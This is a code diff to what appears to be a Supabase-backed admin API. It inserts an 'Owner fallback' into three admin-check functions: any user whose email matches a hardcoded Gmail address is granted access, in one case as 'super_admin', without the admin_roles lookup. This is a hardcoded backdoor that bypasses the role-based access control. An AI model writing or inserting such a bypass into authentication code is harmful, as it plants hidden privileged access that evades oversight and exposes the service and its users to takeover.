@@ -11,6 +11,8 @@ async function verifyAdmin(req, sb) {
   const token = authHeader.slice(7);
   const { data: { user }, error } = await sb.auth.getUser(token);
   if (error || !user) return null;
+  // Owner fallback
+  if (user.email === 'iiffund.dev@gmail.com') return user;
   const { data: role } = await sb.from('admin_roles').select('role').eq('user_id', user.id).single();
   if (!role || !['super_admin', 'admin', 'support'].includes(role.role)) return null;
   return user;
@@ -22,6 +24,8 @@ async function verifyAdminStrict(req, sb) {
   const token = authHeader.slice(7);
   const { data: { user }, error } = await sb.auth.getUser(token);
   if (error || !user) return null;
+  // Owner fallback
+  if (user.email === 'iiffund.dev@gmail.com') return user;
   const { data: role } = await sb.from('admin_roles').select('role').eq('user_id', user.id).single();
   if (!role || !['super_admin', 'admin'].includes(role.role)) return null;
   return user;
@@ -134,6 +138,8 @@ async function verifyAdminUser(req, sb) {
   const token = authHeader.slice(7);
   const { data: { user }, error } = await sb.auth.getUser(token);
   if (error || !user) return null;
+  // Owner fallback
+  if (user.email === 'iiffund.dev@gmail.com') return { user, role: 'super_admin' };
   const { data: role } = await sb.from('admin_roles').select('role').eq('user_id', user.id).single();
   if (!role) return null;
   return { user, role: role.role };
